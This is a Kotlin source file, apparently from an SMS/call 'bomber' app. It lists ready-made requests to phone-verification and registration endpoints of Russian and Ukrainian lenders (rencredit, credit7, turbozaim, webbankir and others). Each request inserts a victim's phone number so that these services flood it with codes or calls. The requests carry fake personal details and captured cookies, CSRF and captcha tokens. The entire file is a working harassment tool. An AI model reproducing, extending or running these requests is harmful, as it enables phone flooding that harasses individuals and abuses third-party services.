@file:Suppress("SpellCheckingInspection")

package com.dm.bomber.services.repository

import com.dm.bomber.services.curl.CurlService
import com.dm.bomber.services.dsl.RequestBuilder
import com.dm.bomber.services.dsl.service


/**
 * @noinspection ALL
 */
val callCentersServices = listOf(
    CurlService(
        """
                        curl 'https://anketa.rencredit.ru/bitrix/services/main/ajax.php?mode=class&c=qsoft%3Av2.application.form&action=sendCode' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Bx-ajax: true' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/x-www-form-urlencoded' \
                          -H 'Cookie: PHPSESSID=gTwa75gEmsmWiz4QGEAciyPerAe9OHmJ; dtCookie=v_4_srv_10_sn_AFE92F67C79B8DF767B09BB3E9EC8287_perc_100000_ol_0_mul_1_app-3Ab087460a1cf792cf_1; COOKIE_PEEFORMANCE=1; rxVisitor=1683473730461RNP20Q0EFAPL7JSJ2CSEB82K7U143PLC; dtSa=-; _gcl_au=1.1.820909609.1683473731; _ym_uid=168347373150047117; _ym_d=1683473731; _ga_C3YQQ4X5YQ=GS1.1.1683473730.1.0.1683473731.59.0.0; _ga=GA1.2.761619278.1683473731; _gid=GA1.2.1999755351.1683473731; _ym_isad=2; _ym_visorc=w; flocktory-uuid=32e6d4f6-3ffa-46ff-bdbd-ff707e6dfe2a-3; dtLatC=1; _gat_UA-8730113-1=1; rxvt=1683475637812|1683473730463; dtPC=10${'$'}473730460_971h8vCVMCSABGLWGKPDCVSNPKUIODRGWAUSOR-0e0' \
                          -H 'Origin: https://anketa.rencredit.ru' \
                          -H 'Referer: https://anketa.rencredit.ru/app/credit/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'X-Bitrix-Csrf-Token: 3468097d9b542db72c66d364e4e401d8' \
                          -H 'X-Bitrix-Site-Id: s1' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'x-dtpc: 10${'$'}473730460_971h8vCVMCSABGLWGKPDCVSNPKUIODRGWAUSOR-0e0' \
                          --data-raw 'mobilePhone={full_phone}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://mobicredit.ru/api/registration/send/code?mobilePhone={phone}&surname=%D0%9A%D0%9F%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA&name=%D0%9F%D0%9A%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA&patronymic=%D0%9F%D0%9A%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA%D0%BF%D0%BA&email=riregeh@gmail.com&birthday=2001-01-01' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Cookie: _ga=GA1.1.2080063708.1689625029; _ga_4SJS2NYGNC=GS1.1.1689625029.1.0.1689625029.0.0.0; _ym_uid=168962502983121350; _ym_d=1689625029; _ym_isad=2; _ym_visorc=w; JSESSIONID=CA5802F4D9D13467A3296143467F74AD; clientaction_png=647b0204-8bfd-8c1b-8c72-d3c35b832e9a; clientaction_etag=647b0204-8bfd-8c1b-8c72-d3c35b832e9a; clientaction_cache=647b0204-8bfd-8c1b-8c72-d3c35b832e9a; CLIENTSESSION=647b0204-8bfd-8c1b-8c72-d3c35b832e9a' \
                          -H 'Origin: https://mobicredit.ru' \
                          -H 'Referer: https://mobicredit.ru/app/step1_register' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{}' \
                          --compressed
                          """.trimIndent()
    ),

    CurlService(
        """
                        curl 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode?productGroup=PDL&phone={full_phone}&brandName=CreditKasa' \
                          -H 'authority: api.creditkasa.ua' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'origin: https://creditkasa.com.ua' \
                          -H 'referer: https://creditkasa.com.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: cross-site' \
                          --compressed
                          """.trimIndent(), 380
    ),

    service(7) {
        method = RequestBuilder.POST
        url = "https://mapi-order.srochnodengi.ru/api/v2/auth/mobileid-auth/"

        headers {
            add("Content-Type", "application/json")
            add("authority", "mapi-order.srochnodengi.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add("origin", "https://order.srochnodengi.ru")
            add("referer", "https://order.srochnodengi.ru/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
            add("user-device", "Windows 10")
            add("user-os", "Edge 116.0.1938.54")
        }

        json("{\"last_name\":\"Иван\",\"first_name\":\"Иванов\",\"middle_name\":\"пцукпук\",\"email\":\"rir$phone@gmail.com\",\"phone\":\"+$phone\",\"birthday\":\"2001-07-05\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://my.joy.money/client-interface/authorize"

        headers {
            add("Content-Type", "application/json")
            add("authority", "my.joy.money")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=UTF-8")
            add(
                "cookie",
                "_ga=GA1.1.925959966.1692893180; _ga_QX3PXFLLRH=GS1.1.1692893180.1.0.1692893180.60.0.0; st_uid=45ec318af62a2b19b164241facb01e89; _ym_uid=1692893180439342653; _ym_d=1692893180; _ym_isad=2; _ym_visorc=w"
            )
            add("origin", "https://my.joy.money")
            add("referer", "https://my.joy.money/login")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"phone\":\"$phone\",\"amount\":\"5000\",\"days\":\"10\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://api.credit7.ru/user"

        headers {
            add("Content-Type", "application/json")
            add("authority", "api.credit7.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add("origin", "https://credit7.ru")
            add("referer", "https://credit7.ru/application/registration/phone")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
            add("x-frontend", "prod-ru-credit7-wp2_prod_develop")
        }

        json("{\"mobile_phone\":\"$phone\",\"step\":\"Step1\",\"target_url\":\"https://credit7.ru/?utm_source=organic\",\"requested_amount\":16000,\"requested_days\":19,\"ga_cid\":\"1431926112.1692892949\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://greenmoney.ru/Account/ConfirmPhone"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "greenmoney.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "greensite_ticksess=ws3a5q2zcpzropvsgagneqxe; culture=ru; url=https://greenmoney.ru/Account/Register; UserHash=fcf1f5be-d46c-45cc-9c85-3dad46c83bf2; __RequestVerificationToken=J8FrK214byeQUDm26duAPSvbNIzzfKFvMfbro-VwksmtfEwOjo9zn_L0noO8esmVD9txsmxVtVIbKXC_TBBlvQLzXqw1; initialTrafficSource=utmcsr=(direct)|utmcmd=(none)|utmccn=(not set); __utmzzses=1; _ga=GA1.2.1562629392.1692892568; _gid=GA1.2.1486863104.1692892568; _ym_uid=1692892568323288171; _ym_d=1692892568; _ym_isad=2; _ym_visorc=b; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; _ga_Y2GRXJCFML=GS1.1.1692892568.1.1.1692892600.0.0.0"
            )
            add("origin", "https://greenmoney.ru")
            add("referer", "https://greenmoney.ru/Account/Register")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add(
                "__RequestVerificationToken",
                "dM16lB4DGJbLkOw346y2ioSB4o2KcV0JLCRsV3fcjAUVJrtvjoUkqSMZT7B0oAuBo7OuZ5ih8CmFPxwTbydSZZuLDMI1"
            )
            add("phone", "+$phone")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://operator.turbozaim.ru:88/api/registration/sendCode"

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add("Origin", "https://lk.turbozaim.ru")
            add("Referer", "https://lk.turbozaim.ru/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-site")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json(
            "{\"refSources\":\"\",\"firstName\":\"Пеупекпек\",\"lastName\":\"упекпук\",\"middleName\":\"\",\"email\":\"rewger@mail.com\",\"birthDate\":\"2001-02-01\",\"phone\":\"${
                phone.format(
                    "+7 (***) *** ** **"
                )
            }\",\"genderId\":\"\",\"insuranceDisablingExperimentValue\":\"A\",\"captchaV3\":\"03ADUVZwAkfLY0EhKTK90aL810_0Lc9SNt5pNnQ_UXjKHZO-cPo4k3TzKte2wbQc-mZnEbRwHSJ1588VJjXJhTbN-VDCLjz_TESrjOUed1BC-PyP9ijShFx2RGlz3xbwcWafyhe2heiADkLFKwHEZbUc-cluItHucD5qzNUX52OjX-V7Tkr4QrdsETk--ra49SlZrp9g1ZvwEe6Im2Iud4kT6qUI4mhK9JNQZQpt2En9kp8hPnLiEbXgvjaWSBPVtzPcElSQFEcMY64fa7Dpz8rPEJ8CloOMuewEH466pjsCbfwacUFpQnbzjooJ2-K_7R4mn4QOhbhWYO252cBRWxz1-TPwrQdLliHAojjXlkUa49tG7j7DJWlWjWVVlom_T9sLASEpNT5M3O4wXLZSnVXPusF30QmLfhXSJvtJzRpIn_0dM0bUoCEvqh2E8PqlJI809O2a4M6k6bk1sIaMZekcHCSoQxrfvg8yDgFUvHMK5_xOK0C4wJrJStDRGRXFS6BAV8CaT4dxcCpquEuELz98TLgRfvX6SgHg\"}"
        )
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://ng-api.webbankir.com/user/v2/phone_verification"

        headers {
            add("Content-Type", "application/json")
            add("authority", "ng-api.webbankir.com")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add(
                "baggage",
                "sentry-environment=production,sentry-release=lk-ng%40WEBDEV-3637-14,sentry-transaction=%2F,sentry-public_key=0e2a5d1f040246e69a77bbaf43a18c77,sentry-trace_id=5600908c4bbd4124abe04906fedb5187,sentry-sample_rate=0.2"
            )
            add("content-type", "application/json")
            add("origin", "https://webbankir.com")
            add("referer", "https://webbankir.com/")
            add("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Microsoft Edge\";v=\"116\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
            add("sentry-trace", "5600908c4bbd4124abe04906fedb5187-a275bd1e35b6f773-0")
        }

        json("{\"data\":{\"type\":\"PhoneVerification\",\"attributes\":{\"phone\":\"$phone\",\"webbankirCrossId\":\"8879b668-4734-4a47-97f0-c9af8b2acf94\"}}}")
    },
)